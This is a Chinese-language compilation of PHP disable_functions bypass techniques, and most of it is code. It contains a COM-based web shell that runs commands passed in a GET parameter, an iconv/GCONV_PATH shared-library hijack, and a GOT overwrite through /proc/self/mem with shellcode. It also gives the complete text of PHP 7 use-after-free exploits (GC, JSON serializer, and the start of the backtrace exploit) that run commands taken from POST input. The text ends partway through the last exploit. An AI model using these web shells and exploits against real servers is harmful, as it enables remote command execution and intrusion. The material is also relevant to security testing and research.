&lt;?php$wsh = isset($_GET[&#x27;wsh&#x27;]) ? $_GET[&#x27;wsh&#x27;] : &#x27;wscript&#x27;;if($wsh == &#x27;wscript&#x27;) &#123;    $command = $_GET[&#x27;cmd&#x27;];    $wshit = new COM(&#x27;WScript.shell&#x27;) or die(&quot;Create Wscript.Shell Failed!&quot;);    $exec = $wshit-&gt;exec(&quot;cmd /c&quot;.$command);    $stdout = $exec-&gt;StdOut();    $stroutput = $stdout-&gt;ReadAll();    echo $stroutput;&#125;elseif($wsh == &#x27;application&#x27;) &#123;    $command = $_GET[&#x27;cmd&#x27;];    $wshit = new COM(&quot;Shell.Application&quot;) or die(&quot;Shell.Application Failed!&quot;);    $exec = $wshit-&gt;ShellExecute(&quot;cmd&quot;,&quot;/c &quot;.$command);&#125;else &#123;  echo(0);&#125;?&gt;


iconv利用条件

Linux 操作系统
putenv
iconv
存在可写的目录, 需要上传 .so 文件

原理
php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()
php的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中
iconv_open函数的执行过程：1：iconv_open函数首先会找到系统提供的gconv-modules文件，查看各个字符集的.so文件所在位置2：然后再根据gconv-modules文件的指示去链接参数对应的.so文件3：之后会调用.so文件中的gconv()与gonv_init()函数
使用的时候在编码转换时指定设置好的xxx编码，就会去调用指定的so文件了
利用
gconv-modules
module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2module  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2

payload.c
gcc payload.c -o payload.so -shared -fPIC
#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gconv() &#123;&#125;void gconv_init() &#123;  puts(&quot;pwned&quot;);  system(&quot;ls / &gt; /tmp/1.txt&quot;);  exit(0);&#125;

1.php
&lt;?php    putenv(&quot;GCONV_PATH=/tmp/&quot;);    iconv(&quot;payload&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;);    // 其他调用了iconv_open()的函数也可以触发rce    // iconv_strlen(&quot;1&quot;,&quot;payload&quot;);?&gt;



linux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的gconv-modules文件

将 gconv-modules 和编译好的 payload.so 传入tmp后执行1.php即可
写shellcode劫持got表深入了解GOT,PLT和动态链接
劫持got表的思路

读 &#x2F;proc&#x2F;self&#x2F;maps 和 &#x2F;proc&#x2F;self&#x2F;exe ，分别找到程序基地址，栈地址，libc地址和利用函数(open)的got表地址
写 &#x2F;proc&#x2F;self&#x2F;mem ，修改利用函数(open)的got表地址为存放shellcode的地址
构造shellcode并写入
通过例如readfile等可以调用open函数的函数来触发shellcode

&lt;?php/***https://xz.aliyun.com/t/7990https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485666&amp;idx=1&amp;sn=71a0cce05637edd488cb9cccb3967504***//*section tables type*/define(&#x27;SHT_NULL&#x27;,0);define(&#x27;SHT_PROGBITS&#x27;,1);define(&#x27;SHT_SYMTAB&#x27;,2);define(&#x27;SHT_STRTAB&#x27;,3);define(&#x27;SHT_RELA&#x27;,4);define(&#x27;SHT_HASH&#x27;,5);define(&#x27;SHT_DYNAMIC&#x27;,6);define(&#x27;SHT_NOTE&#x27;,7);define(&#x27;SHT_NOBITS&#x27;,8);define(&#x27;SHT_REL&#x27;,9);define(&#x27;SHT_SHLIB&#x27;,10);define(&#x27;SHT_DNYSYM&#x27;,11);define(&#x27;SHT_INIT_ARRAY&#x27;,14);define(&#x27;SHT_FINI_ARRAY&#x27;,15);//why does section tables have so many fuck typedefine(&#x27;SHT_GNU_HASH&#x27;,0x6ffffff6);define(&#x27;SHT_GNU_versym&#x27;,0x6fffffff);define(&#x27;SHT_GNU_verneed&#x27;,0x6ffffffe);class elf&#123;    private $elf_bin;    private $strtab_section=array();    private $rel_plt_section=array();    private $dynsym_section=array();    public $shared_librarys=array();    public $rel_plts=array();    public function getElfBin()    &#123;        return $this-&gt;elf_bin;    &#125;    public function setElfBin($elf_bin)    &#123;        $this-&gt;elf_bin = fopen($elf_bin,&quot;rb&quot;);    &#125;    public function unp($value)    &#123;        return hexdec(bin2hex(strrev($value)));    &#125;    public function get($start,$len)&#123;        fseek($this-&gt;elf_bin,$start);        $data=fread ($this-&gt;elf_bin,$len);        rewind($this-&gt;elf_bin);        return $this-&gt;unp($data);    &#125;    public function get_section($elf_bin=&quot;&quot;)&#123;        if ($elf_bin)&#123;            $this-&gt;setElfBin($elf_bin);        &#125;        $this-&gt;elf_shoff=$this-&gt;get(0x28,8);        $this-&gt;elf_shentsize=$this-&gt;get(0x3a,2);        $this-&gt;elf_shnum=$this-&gt;get(0x3c,2);        $this-&gt;elf_shstrndx=$this-&gt;get(0x3e,2);        for ($i=0;$i&lt;$this-&gt;elf_shnum;$i+=1)&#123;            $sh_type=$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+4,4);            switch ($sh_type)&#123;                case SHT_STRTAB:                    $this-&gt;strtab_section[$i]=                        array(                            &#x27;strtab_offset&#x27;=&gt;$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+24,8),                            &#x27;strtab_size&#x27;=&gt;$this-&gt;strtab_size=$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+32,8)                        );                    break;                case SHT_RELA:                    $this-&gt;rel_plt_section[$i]=                        array(                            &#x27;rel_plt_offset&#x27;=&gt;$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+24,8),                            &#x27;rel_plt_size&#x27;=&gt;$this-&gt;strtab_size=$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+32,8),                            &#x27;rel_plt_entsize&#x27;=&gt;$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+56,8)                        );                    break;                case SHT_DNYSYM:                    $this-&gt;dynsym_section[$i]=                        array(                            &#x27;dynsym_offset&#x27;=&gt;$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+24,8),                            &#x27;dynsym_size&#x27;=&gt;$this-&gt;strtab_size=$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+32,8),                            &#x27;dynsym_entsize&#x27;=&gt;$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+56,8)                        );                    break;                case SHT_NULL:                case SHT_PROGBITS:                case SHT_DYNAMIC:                case SHT_SYMTAB:                case SHT_NOBITS:                case SHT_NOTE:                case SHT_FINI_ARRAY:                case SHT_INIT_ARRAY:                case SHT_GNU_versym:                case SHT_GNU_HASH:                    break;                default:                    //                   echo &quot;who knows what $sh_type this is? &quot;;            &#125;        &#125;    &#125;    public function get_reloc()&#123;        $rel_plts=array();        $dynsym_section= reset($this-&gt;dynsym_section);        $strtab_section=reset($this-&gt;strtab_section);        foreach ($this-&gt;rel_plt_section as $rel_plt )&#123;            for ($i=$rel_plt[&#x27;rel_plt_offset&#x27;];$i&lt;$rel_plt[&#x27;rel_plt_offset&#x27;]+$rel_plt[&#x27;rel_plt_size&#x27;];$i+=$rel_plt[&#x27;rel_plt_entsize&#x27;])            &#123;                $rel_offset=$this-&gt;get($i,8);                $rel_info=$this-&gt;get($i+8,8)&gt;&gt;32;                $fun_name_offset=$this-&gt;get($dynsym_section[&#x27;dynsym_offset&#x27;]+$rel_info*$dynsym_section[&#x27;dynsym_entsize&#x27;],4);                $fun_name_offset=$strtab_section[&#x27;strtab_offset&#x27;]+$fun_name_offset-1;                $fun_name=&#x27;&#x27;;                while ($this-&gt;get(++$fun_name_offset,1)!=&quot;&quot;)&#123;                    $fun_name.=chr($this-&gt;get($fun_name_offset,1));                &#125;                $rel_plts[$fun_name]=$rel_offset;            &#125;        &#125;        $this-&gt;rel_plts=$rel_plts;    &#125;    public function get_shared_library($elf_bin=&quot;&quot;)&#123;        if ($elf_bin)&#123;            $this-&gt;setElfBin($elf_bin);        &#125;        $shared_librarys=array();        $dynsym_section=reset($this-&gt;dynsym_section);        $strtab_section=reset($this-&gt;strtab_section);        for($i=$dynsym_section[&#x27;dynsym_offset&#x27;]+$dynsym_section[&#x27;dynsym_entsize&#x27;];$i&lt;$dynsym_section[&#x27;dynsym_offset&#x27;]+$dynsym_section[&#x27;dynsym_size&#x27;];$i+=$dynsym_section[&#x27;dynsym_entsize&#x27;])        &#123;            $shared_library_offset=$this-&gt;get($i+8,8);            $fun_name_offset=$this-&gt;get($i,4);            $fun_name_offset=$fun_name_offset+$strtab_section[&#x27;strtab_offset&#x27;]-1;            $fun_name=&#x27;&#x27;;            while ($this-&gt;get(++$fun_name_offset,1)!=&quot;&quot;)&#123;                $fun_name.=chr($this-&gt;get($fun_name_offset,1));            &#125;            $shared_librarys[$fun_name]=$shared_library_offset;        &#125;        $this-&gt;shared_librarys=$shared_librarys;    &#125;    public function close()&#123;        fclose($this-&gt;elf_bin);    &#125;    public function __destruct()    &#123;        $this-&gt;close();    &#125;    public function packlli($value) &#123;        $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32;        $lower = $value &amp; 0x00000000ffffffff;        return pack(&#x27;V2&#x27;, $lower, $higher);    &#125;&#125;// step1：拿到open函数的got表的地址$test=new elf();$test-&gt;get_section(&#x27;/proc/self/exe&#x27;); //解析/proc/self/exe即当前程序$test-&gt;get_reloc();  //获得各函数的got表的地址$open_php=$test-&gt;rel_plts[&#x27;open&#x27;];// step2：拿到程序基地址，栈地址，libc地址$maps = file_get_contents(&#x27;/proc/self/maps&#x27;);preg_match(&#x27;/(\w+)-(\w+)\s+.+\[stack]/&#x27;, $maps, $stack);preg_match(&#x27;/(\w+)-(\w+).*?libc-/&#x27;,$maps,$libcgain);$libc_base = &quot;0x&quot;.$libcgain[1];echo &quot;Libc base: &quot;.$libc_base.&quot;\n&quot;;echo &quot;Stack location: &quot;.$stack[1].&quot;\n&quot;;$pie_base = hexdec(&quot;0x&quot;.(explode(&#x27;-&#x27;, $maps)[0]));echo &quot;PIE base: &quot;.$pie_base.&quot;\n&quot;;// step3：计算system的实际地址$test2=new elf();preg_match(&#x27;#.*?(/.*libc-\d.\d\d.so)#&#x27;,$maps,$libc); // 匹配libc$test2-&gt;get_section($libc[1]);$test2-&gt;get_reloc();$test2-&gt;get_shared_library(); //获得libc中的各函数的地址$sys = $test2-&gt;shared_librarys[&#x27;system&#x27;];  //获取libc中system的偏移$sys_addr = $sys + hexdec($libc_base);  //加上libc基地址获得system函数的实际地址echo &quot;system addr: &quot;.$sys_addr.&quot;\n&quot;;// step4：修改got表指向的地址$mem = fopen(&#x27;/proc/self/mem&#x27;,&#x27;wb&#x27;); //修改该文件相当于直接修改当前进程的内存$shellcode_loc = $pie_base + 0x2333;  //随便找一个存放shellcode的地址fseek($mem,$open_php);  //文件指针定位到open函数的got表的地址fwrite($mem,$test-&gt;packlli($shellcode_loc)); //向open函数的got表的地址写入我们shellcode的存放地址// step5：写入命令到shellcode，并将shellcode写入到之前指定的地址中$command=&quot;ls &gt; /var/www/html/1.txt&quot;;//$command=$_GET[&#x27;cmd&#x27;];$stack=hexdec(&quot;0x&quot;.$stack[1]);fseek($mem, $stack);  //文件指针定位到栈地址fwrite($mem, &quot;&#123;$command&#125;\x00&quot;);  //向栈地址写入要执行的命令$cmd = $stack;  //$cmd变量的值即为要执行的命令的存放地址$shellcode = &quot;H\xbf&quot;.$test-&gt;packlli($cmd).&quot;H\xb8&quot;.$test-&gt;packlli($sys_addr).&quot;P\xc3&quot;;fseek($mem,$shellcode_loc); //文件指针定位到之前写入open函数got表的地址fwrite($mem,$shellcode); //向该地址写入处理好的shellcode// step6：触发open函数readfile(&#x27;aaa&#x27;,&#x27;r&#x27;); //通过readfile函数调用open函数，在跳转到got表指向的地址即进入我们的shellcode地址执行echo &quot;DONE\n&quot;;exit();

其中的shellcode为
&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; context.arch = &quot;amd64&quot;&gt;&gt;&gt; shellcode=&#x27;&#x27;&#x27;... mov rdi,0xffffffff... mov rax,0xffffffff... push rax... ret... &#x27;&#x27;&#x27;&gt;&gt;&gt;&gt;&gt;&gt; asm(shellcode)b&#x27;H\xbf\xff\xff\xff\xff\x00\x00\x00\x00H\xb8\xff\xff\xff\xff\x00\x00\x00\x00P\xc3&#x27;



利用条件

&#x2F;proc&#x2F;self&#x2F;mem 可读写
Linux 内核版本 &gt;&#x3D; 2.98
PHP-CGI 或 PHP-FPM 启动

apache+php 由于 apache 调用 setuid 设置 www-data 权限工作进程，&#x2F;proc&#x2F;self&#x2F;mem 属于 www-data 且权限是600，&#x2F;proc&#x2F;self&#x2F; 目录属于root用户，导致没有权限读写
但是对于 Nginx+php ，且为低版本的 php-fpm（PHP&lt;5.6），&#x2F;proc&#x2F;self&#x2F;属于 www-data ，可以通过写入GOT表来实现RCE

注：我在实际利用中并没有成功

利用UAF Bypass各种利用二进制漏洞去攻击的手法原理就不细说了，也不太懂pwn，放链接了
php7_GC_UAF（PHP 7.0-7.3）利用条件

Linux 操作系统
PHP7.0 - all versions to date
PHP7.1 - all versions to date
PHP7.2 - all versions to date
PHP7.3 - all versions to date

原理
通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令
PHP中的内存破坏漏洞利用学习(1st)
exp
&lt;?php# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=72530## This exploit should work on all PHP 7.0-7.3 versions## Author: https://github.com/mm0r1//pwn(&quot;uname -a&quot;);pwn($_POST[&#x27;cmd&#x27;]);function pwn($cmd) &#123;    global $abc, $helper;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                # &#x27;constant&#x27; constant check                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                # &#x27;bin2hex&#x27; constant check                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    class ryat &#123;        var $ryat;        var $chtg;                function __destruct()        &#123;            $this-&gt;chtg = $this-&gt;ryat;            $this-&gt;ryat = 1;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;        die(&#x27;This PoC is for *nix systems only.&#x27;);    &#125;    $n_alloc = 10; # increase this value if you get segfaults    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_repeat(&#x27;A&#x27;, 79);    $poc = &#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;;    $out = unserialize($poc);    gc_collect_cycles();    $v = [];    $v[0] = ptr2str(0, 79);    unset($v);    $abc = $out[2][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#x27;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#x27;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#x27;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#x27;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;

JSON_Serializer_UAF（PHP 7.1-7.3）利用条件

Linux 操作系统
PHP7.1 - all versions to date
PHP7.2 &lt; 7.2.19 (released: 30 May 2019)
PHP7.3 &lt; 7.3.6 (released: 30 May 2019)

原理
此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令
Use after free with json serializer
exp
&lt;?php//$cmd = &quot;id&quot;;$cmd = $_POST[&#x27;cmd&#x27;];$n_alloc = 10; # increase this value if you get segfaultsclass MySplFixedArray extends SplFixedArray &#123;    public static $leak;&#125;class Z implements JsonSerializable &#123;    public function write(&amp;$str, $p, $v, $n = 8) &#123;      $i = 0;      for($i = 0; $i &lt; $n; $i++) &#123;        $str[$p + $i] = chr($v &amp; 0xff);        $v &gt;&gt;= 8;      &#125;    &#125;    public function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    public function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    # unable to leak ro segments    public function leak1($addr) &#123;        global $spl1;        $this-&gt;write($this-&gt;abc, 8, $addr - 0x10);        return strlen(get_class($spl1));    &#125;    # the real deal    public function leak2($addr, $p = 0, $s = 8) &#123;        global $spl1, $fake_tbl_off;        # fake reference zval        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x20, 6); # type (string)        $leak = strlen($spl1::$leak);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    public function parse_elf($base) &#123;        $e_type = $this-&gt;leak2($base, 0x10, 2);        $e_phoff = $this-&gt;leak2($base, 0x20);        $e_phentsize = $this-&gt;leak2($base, 0x36, 2);        $e_phnum = $this-&gt;leak2($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = $this-&gt;leak2($header, 0, 4);            $p_flags = $this-&gt;leak2($header, 4, 4);            $p_vaddr = $this-&gt;leak2($header, 0x10);            $p_memsz = $this-&gt;leak2($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    public function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = $this-&gt;leak2($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = $this-&gt;leak2($leak);                # &#x27;constant&#x27; constant check                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = $this-&gt;leak2($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = $this-&gt;leak2($leak);                # &#x27;bin2hex&#x27; constant check                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    public function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = $this-&gt;leak2($addr, 0, 7);            if($leak == 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    public function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = $this-&gt;leak2($addr);            $f_name = $this-&gt;leak2($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123; # system                return $this-&gt;leak2($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    public function jsonSerialize() &#123;        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;        $contiguous = [];        for($i = 0; $i &lt; $n_alloc; $i++)            $contiguous[] = new DateInterval(&#x27;PT1S&#x27;);        $room = [];        for($i = 0; $i &lt; $n_alloc; $i++)            $room[] = new Z();        $_protector = $this-&gt;ptr2str(0, 78);        $this-&gt;abc = $this-&gt;ptr2str(0, 79);        $p = new DateInterval(&#x27;PT1S&#x27;);        unset($y[0]);        unset($p);        $protector = &quot;.$_protector&quot;;        $x = new DateInterval(&#x27;PT1S&#x27;);        $x-&gt;d = 0x2000;        $x-&gt;h = 0xdeadbeef;        # $this-&gt;abc is now of size 0x2000        if($this-&gt;str2ptr($this-&gt;abc) != 0xdeadbeef) &#123;            die(&#x27;UAF failed.&#x27;);        &#125;        $spl1 = new MySplFixedArray();        $spl2 = new MySplFixedArray();        # some leaks        $class_entry = $this-&gt;str2ptr($this-&gt;abc, 0x120);        $handlers = $this-&gt;str2ptr($this-&gt;abc, 0x128);        $php_heap = $this-&gt;str2ptr($this-&gt;abc, 0x1a8);        $abc_addr = $php_heap - 0x218;        # create a fake class_entry        $fake_obj = $abc_addr;        $this-&gt;write($this-&gt;abc, 0, 2); # type        $this-&gt;write($this-&gt;abc, 0x120, $abc_addr); # fake class_entry        # copy some of class_entry definition        for($i = 0; $i &lt; 16; $i++) &#123;            $this-&gt;write($this-&gt;abc, 0x10 + $i * 8,                 $this-&gt;leak1($class_entry + 0x10 + $i * 8));        &#125;        # fake static members table        $fake_tbl_off = 0x70 * 4 - 16;        $this-&gt;write($this-&gt;abc, 0x30, $abc_addr + $fake_tbl_off);        $this-&gt;write($this-&gt;abc, 0x38, $abc_addr + $fake_tbl_off);        # fake zval_reference        $this-&gt;write($this-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 8, 10); # zval type (reference)        # look for binary base        $binary_leak = $this-&gt;leak2($handlers + 0x10);        if(!($base = $this-&gt;get_binary_base($binary_leak))) &#123;            die(&quot;Couldn&#x27;t determine binary base address&quot;);        &#125;        # parse elf header        if(!($elf = $this-&gt;parse_elf($base))) &#123;            die(&quot;Couldn&#x27;t parse ELF&quot;);        &#125;        # get basic_functions address        if(!($basic_funcs = $this-&gt;get_basic_funcs($base, $elf))) &#123;            die(&quot;Couldn&#x27;t get basic_functions address&quot;);        &#125;        # find system entry        if(!($zif_system = $this-&gt;get_system($basic_funcs))) &#123;            die(&quot;Couldn&#x27;t get zif_system address&quot;);        &#125;                # copy hashtable offsetGet bucket        $fake_bkt_off = 0x70 * 5 - 16;        $function_data = $this-&gt;str2ptr($this-&gt;abc, 0x50);        for($i = 0; $i &lt; 4; $i++) &#123;            $this-&gt;write($this-&gt;abc, $fake_bkt_off + $i * 8,                 $this-&gt;leak2($function_data + 0x40 * 4, $i * 8));        &#125;        # create a fake bucket        $fake_bkt_addr = $abc_addr + $fake_bkt_off;        $this-&gt;write($this-&gt;abc, 0x50, $fake_bkt_addr);        for($i = 0; $i &lt; 3; $i++) &#123;            $this-&gt;write($this-&gt;abc, 0x58 + $i * 4, 1, 4);        &#125;        # copy bucket zval        $function_zval = $this-&gt;str2ptr($this-&gt;abc, $fake_bkt_off);        for($i = 0; $i &lt; 12; $i++) &#123;            $this-&gt;write($this-&gt;abc,  $fake_bkt_off + 0x70 + $i * 8,                 $this-&gt;leak2($function_zval, $i * 8));        &#125;        # pwn        $this-&gt;write($this-&gt;abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);        $this-&gt;write($this-&gt;abc, $fake_bkt_off, $fake_bkt_addr + 0x70);        $spl1-&gt;offsetGet($cmd);        exit();    &#125;&#125;$y = [new Z()];json_encode([&amp;$y]);

php7_Backtrace_UAF（PHP 7.0-7.4）利用条件

Linux 操作系统
PHP7.0 - all versions to date
PHP7.1 - all versions to date
PHP7.2 - all versions to date
PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)
PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)

原理
该漏洞利用在 debug_backtrace() 函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞
Use-after-free when accessing already destructed backtrace arguments
exp
&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable# that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1//pwn(&quot;uname -a&quot;);pwn($_POST[&#x27;cmd&#x27;]);function pwn($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        